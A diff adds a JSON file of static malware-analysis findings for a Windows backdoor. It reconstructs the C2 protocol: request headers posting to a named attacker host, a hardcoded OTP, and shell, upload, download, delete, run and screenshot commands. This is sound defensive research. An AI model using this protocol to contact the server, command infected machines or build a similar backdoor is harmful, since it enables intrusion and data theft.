@@ -1,0 +1,307 @@
+{
+  "status": "canonical static protocol findings",
+  "network_offline_at_note_generation": true,
+  "specimen_executed": false,
+  "sample_sha256": "5d8df4c2d08cff5f1c0de8eab56e47ae543bd5c6d2ef04573f61ebb9fbc65716",
+  "method": "Guest-only objdump plus Ghidra headless decompilation, corroborated with pointer-based literal reads and call-site argument tracing. All full decompiled C and sample bytes remain in Kali.",
+  "functions": {
+    "poll": "0x4082c0",
+    "upload": "0x40a500",
+    "download": "0x40b050",
+    "json_string_getter": "0x41a210",
+    "json_parse_wrapper": "0x41a0f0",
+    "client_id": "0x40c560",
+    "basename": "0x40bf30",
+    "directory_list": "0x407cf0",
+    "drive_list": "0x40bfc0"
+  },
+  "poll": {
+    "url": "http://www.chestergreenfarming.com:80/peachforthevictory/",
+    "signature_evidence": "Returned std::string is ECX (main ebp-15c); EDX host; stack port,path,client_id,response_type,response_data. Main response_type ebp-c4; JSON response_data ebp-64.",
+    "request_headers": [
+      "POST /peachforthevictory/ HTTP/1.1",
+      "Host: www.chestergreenfarming.com",
+      "Content-Type: application/json; charset=utf-8",
+      "Content-Length: <serialized body byte count>",
+      "Connection: close"
+    ],
+    "body_schema": {
+      "client_id": "JSON string username_computername",
+      "<response_type>": "Native JSON response_data, dynamically named second member"
+    },
+    "body_evidence": [
+      "0x40847f key client_id construction",
+      "0x4084bc client ID JSON string",
+      "0x408516 response-type JSON string",
+      "0x408538-0x40857e two initializer pairs and object",
+      "0x4085de JSON dump",
+      "0x40865a POST path;0x408736 Host;0x4088a0 content type;0x408950 length;0x408aa3 close"
+    ],
+    "initial_request_example": {
+      "client_id": "<username>_<computername>",
+      "fdd": null
+    },
+    "initial_evidence": [
+      "0x40d876 literal fdd at VA479c34",
+      "0x40d89b-0x40d8a4 JSON null initialization"
+    ],
+    "server_response_schema": {
+      "next_data": "JSON string containing serialized command object, e.g. {\"type\":\"FDD\",\"value\":\"<directory>\"}"
+    },
+    "command_schema": {
+      "type": "Case-sensitive JSON string matching supported command",
+      "value": "JSON string; arrays, objects, booleans, numbers and null fail string getter"
+    },
+    "response_processing": [
+      "Read socket until termination/EOF; non-EOF read error is checked and thrown in poll helper.",
+      "Split at first CRLFCRLF; if absent, attempt to parse entire returned text.",
+      "Remove UTF8 BOM EFBBBF and leading/trailing isspace characters.",
+      "Parse JSON with allow_exceptions=false; discarded parse result yields empty string.",
+      "If next_data member exists, extract it with string-only getter; return it unchanged. Missing member yields empty string.",
+      "No HTTP status-line validation or chunked decoder in reviewed poll path.",
+      "Main directly JSON-parses returned next_data with exceptions enabled. No command/response XOR."
+    ],
+    "response_evidence": [
+      "0x4091f5-0x40921b non-EOF error throw",
+      "0x409232 CRLFCRLF search",
+      "0x40936e full-text fallback",
+      "0x40939e-0x4093bf BOM removal",
+      "0x409404-0x4094c8 whitespace trim",
+      "0x4094ca-0x4094f2 JSON parse/discarded test",
+      "0x4097dc-0x40989a next_data presence",
+      "0x4098a0-0x4098b8 string extraction",
+      "0x409bce empty return",
+      "0x40da8c-0x40daa5 direct command parse",
+      "0x41a210 getter requires JSON tag3; nonstring throws type_error302"
+    ],
+    "state_behavior": "A nonempty command resets response_type to empty and clears response_data with type-dependent JSON clear semantics, preserving its prior JSON type (e.g. array becomes empty array, string becomes empty string; initial null remains null). Empty next_data retains previous response state. FDD makes an extra immediate result POST, discards that next_data, and later outer polls repeat its fdd/listing. Detached shell result POST also discards returned next_data. UPP and SS1 use separate transfer POSTs without assigning a JSON status; next main poll can therefore contain an empty member name with the cleared prior JSON type. See lifecycle-deep-findings.json for exact reset branches.",
+    "network_retry_limits": "No explicit operation-level timeout or bounded retry policy in reviewed request helpers. Normal main loop uses 14-24 second jitter; standard MSVC std::exception catch continuations retry main polling, with outer poll/parsing exceptions able to bypass that jitter. This is static control flow, not measured runtime behavior."
+  },
+  "file_transfers": {
+    "otp": {
+      "value": "123456",
+      "encoding": "Hardcoded UTF16 literal converted to narrow/UTF8 header string",
+      "literal_va": "0x479c6c",
+      "evidence": [
+        "0x40e847 length6;0x40e856 pointer;0x40e86c assign for UPP",
+        "0x40ec18 pointer;0x40ec27 assign for DWW",
+        "0x40f4ba pointer for SS1"
+      ],
+      "correction": "P123456 was an unaligned blind UTF16 scan across ASCII UPP terminator; referenced pointer begins at digit1."
+    },
+    "client_id": {
+      "value": "GetUserNameW + \"_\" + GetComputerNameW",
+      "literal_separator_va": "0x479bc8",
+      "evidence": [
+        "0x40c5e0 GetUserNameW",
+        "0x40c608 GetComputerNameW",
+        "0x40c560 concatenation"
+      ],
+      "registration": "Same identity is JSON client_id for poll and ClientID header for file transfer; no other host inventory or dedicated registration request established in reviewed startup path."
+    },
+    "upload": {
+      "url": "http://www.chestergreenfarming.com:80/peachforthevictory/receive.php",
+      "headers": [
+        "POST /peachforthevictory/receive.php HTTP/1.1",
+        "Host: www.chestergreenfarming.com",
+        "Content-Type: multipart/form-data; boundary=----Boundary43985743985798fjkfscxWW",
+        "Content-Length: <multipart byte count>",
+        "OTP: 123456",
+        "ClientID: <username>_<computername>",
+        "Connection: close"
+      ],
+      "boundary": "----Boundary43985743985798fjkfscxWW",
+      "body_schema": "One file part: --boundary\\r\\n; Content-Disposition: form-data; name=\"file\"; filename=\"<basename>\"\\r\\n; Content-Type: application/octet-stream\\r\\n\\r\\n; raw file bytes; \\r\\n--boundary--\\r\\n. Here \\r\\n denotes actual CRLF.",
+      "file_handling": "Convert supplied UTF16 path to UTF8, obtain filename after last slash or backslash; read whole file in binary mode via 0x40a0d0 into memory. File-open failure throws Cannot open file (UTF-16 path unsupported by locale). No path escaping or multipart filename sanitization established.",
+      "response_handling": "Read socket into stream buffer to termination, then return the entire raw HTTP response string. No status/header/body parsing and no check of returned read error_code in reviewed upload wrapper. UPP and SS1 call sites destroy this result.",
+      "evidence": [
+        "0x40a0d0 binary file reader, openmode0x21",
+        "upload guest C126-146 filename extraction",
+        "0x40a70b fixed boundary length35",
+        "0x40a77a Content-Disposition;0x40a7ab content type",
+        "0x40a854-0x40a99b HTTP/header assembly",
+        "0x40abb3 read helper",
+        "0x40ac38 response string copy"
+      ]
+    },
+    "download": {
+      "url": "http://www.chestergreenfarming.com:80/peachforthevictory/send.php?file=<UTF8 basename of value>",
+      "headers": [
+        "GET /peachforthevictory/send.php?file=<basename> HTTP/1.1",
+        "Host: www.chestergreenfarming.com",
+        "OTP: 123456",
+        "ClientID: <username>_<computername>",
+        "Connection: close"
+      ],
+      "value_semantics": "DWW value is a string used as full local UTF16 destination. Basename after last slash/backslash (hardcoded character set /\\ at VA479bb8) supplies remote filename. UTF8 filename is appended directly; no percent encoding in reviewed composition helpers.",
+      "response_handling": [
+        "Read until socket termination; download wrapper does not explicitly inspect returned read error_code.",
+        "Require first CRLFCRLF separator, else throw Invalid HTTP response.",
+        "Only continue to write if header substring contains exact case-sensitive 200 OK; this is a substring test, not status-code parsing. Nonmatching response returns without writing.",
+        "Write all bytes after separator with binary ofstream to full local destination; mode0x22 (out|binary). Open failure throws Cannot write to file (UTF-16 path unsupported by locale).",
+        "No transfer decoding, Content-Length validation, chunked framing decoder or explicit integrity verification in reviewed helper. Main can refresh fdd even when status substring rejected response."
+      ],
+      "evidence": [
+        "0x40ec94 basename call",
+        "0x40bf30 searches last /\\ via0x41ae90",
+        "0x40b1d5 literal ?file=",
+        "0x40b1fc direct append via0x41a040",
+        "0x40b60a/0x40b61d separator check",
+        "0x40b6d8/0x40b6e9 200 OK search",
+        "0x40b71a binary output-open helper0x40f600",
+        "0x40b744-0x40b757 body write"
+      ]
+    }
+  },
+  "command_response_map": [
+    {
+      "type": "msg",
+      "value": "command string",
+      "response_key": "msg",
+      "response_value": "Captured stdout/stderr pipe output as a JSON string, posted by detached shell worker.",
+      "evidence": [
+        "0x40db70 static prefix decode",
+        "0x40cf85 CreateProcessW",
+        "0x40d12d shell-output POST"
+      ]
+    },
+    {
+      "type": "ms2",
+      "value": "PowerShell command string",
+      "response_key": "msg",
+      "response_value": "Same detached worker and string result as msg.",
+      "evidence": [
+        "0x40df5b static prefix decode",
+        "0x40e153 thread construction"
+      ]
+    },
+    {
+      "type": "FDD",
+      "value": "local directory path string",
+      "response_key": "fdd",
+      "response_value": "Directory array; immediately POSTed then preserved for subsequent outer polls. Immediate POST return is discarded.",
+      "evidence": [
+        "0x40e492 directory_list",
+        "0x40e69d immediate POST",
+        "0x40e6a2 returned next_data destruction"
+      ]
+    },
+    {
+      "type": "UPP",
+      "value": "local file path string",
+      "response_key": null,
+      "response_value": "Separate multipart upload; raw HTTP response returned by uploader is discarded. No handler-authored JSON status response. Main response type remains empty string and data remains the type-preserving cleared prior JSON value.",
+      "evidence": [
+        "0x40e88b JSON string getter",
+        "0x40e98c uploader"
+      ]
+    },
+    {
+      "type": "DWW",
+      "value": "local destination file path string, whose basename is the requested server filename",
+      "response_key": "fdd",
+      "response_value": "Refresh directory listing of destination parent after downloader returns. This is not a reliable transfer-success acknowledgment.",
+      "evidence": [
+        "0x40ec6f UTF16 destination",
+        "0x40ec94 basename",
+        "0x40ece4 downloader",
+        "main guest C940 directory refresh"
+      ]
+    },
+    {
+      "type": "DEL",
+      "value": "local file path string",
+      "response_key": "fdd",
+      "response_value": "Refresh parent directory listing after delete attempt; delete return is not checked.",
+      "evidence": [
+        "0x40f094 CRT delete",
+        "0x40f12f directory refresh"
+      ]
+    },
+    {
+      "type": "RUN",
+      "value": "executable path string",
+      "response_key": "sts",
+      "response_value": "JSON string success or failed according to CreateProcessW return.",
+      "evidence": [
+        "0x40f26a CreateProcessW",
+        "0x4299fe type3 and success literal",
+        "0x429abe type3 and failed literal"
+      ]
+    },
+    {
+      "type": "GDR",
+      "value": "string (extracted and UTF16-converted, but unused by drive enumeration)",
+      "response_key": "fdd",
+      "response_value": "Array of drive roots C through Z; fields name,isDir:true,size:0,fmod:0.",
+      "evidence": [
+        "0x40f362 drive_list",
+        "0x40c00f GetLogicalDrives"
+      ]
+    },
+    {
+      "type": "SS1",
+      "value": "path string; code appends \\ss.jpg and tests the whole resulting path with stat mode directory bit",
+      "response_key": null,
+      "response_value": "If screenshot capture succeeds, separate multipart upload; returned HTTP response is discarded. Main response type remains empty string and data remains the type-preserving cleared prior JSON value.",
+      "evidence": [
+        "0x40f42f path predicate",
+        "0x40f4aa screenshot",
+        "0x40f530 uploader"
+      ]
+    }
+  ],
+  "directory_schema": {
+    "value": "JSON array of entry objects",
+    "fields": {
+      "name": "UTF8 filename string",
+      "isDir": "JSON boolean from FILE_ATTRIBUTE_DIRECTORY",
+      "size": "JSON unsigned64: (nFileSizeHigh<<32)|nFileSizeLow",
+      "fmod": "Local-time last-write string YYYY-MM-DD HH:MM:SS"
+    },
+    "filters": "Skips . and .. entries.",
+    "evidence": [
+      "0x407cf0 FindFirst/FindNext enumeration",
+      "0x425f89 JSON unsigned tag6",
+      "0x407c55 FileTimeToSystemTime",
+      "0x407c67 SystemTimeToTzSpecificLocalTime",
+      "0x407c95 format literalVA479944"
+    ]
+  },
+  "drive_schema": {
+    "value": "Array with same four field names",
+    "fields": {
+      "name": "Drive root C:\\ through Z:\\ for set bits in GetLogicalDrives",
+      "isDir": true,
+      "size": 0,
+      "fmod": 0
+    },
+    "limit": "A and B are not iterated. fmod is numeric zero here, unlike directory string."
+  },
+  "screenshot_path": {
+    "derived": "UTF16(value) + \"\\ss.jpg\"",
+    "predicate": "stat(full derived path) succeeds and st_mode & 0x4000 (_S_IFDIR) is nonzero. It tests appended ss.jpg path itself, not just parent directory.",
+    "fallback": "C:\\programdata\\ss.jpg",
+    "evidence": [
+      "0x40f421 concatenation",
+      "0x40f42f/0x40f436 predicate branch",
+      "0x407bd0 stat/mode predicate",
+      "0x44d4d2 thunk to0x44cce5 CRT _wstat64i32"
+    ],
+    "limit": "Directory predicate on an image filename is odd; successful intended screenshot behavior was not tested at runtime."
+  },
+  "remaining_limits": [
+    "Static analysis only. No successful backdoor connection, remote command, file upload/download or screenshot execution was demonstrated.",
+    "No operator/server implementation or C2 replies obtained; expected schemas are reconstructed from client-side code.",
+    "Error and retry behavior derives from inspected static helpers and MSVC catch continuations; library/OS failure combinations were not exhaustively tested.",
+    "No specific family or actor attribution established.",
+    "No direct EXE-authored persistence established in reviewed functions; installer script persistence is independently documented by parent."
+  ],
+  "corrections_to_preliminary_notes": [
+    "OTP is123456 for all UPP,DWW,SS1.",
+    "Static configuration/prefix XOR is not a wire command or response cipher.",
+    "Screenshot path has conditional whole-path directory predicate; fallback is not the only branch.",
+    "MSVC EH continuation funclets are ordinary catch handlers, not proven opaque control flow.",
+    "Recurring polling jitter is14-24seconds;5seconds is a separate initial delay."
+  ]
+}
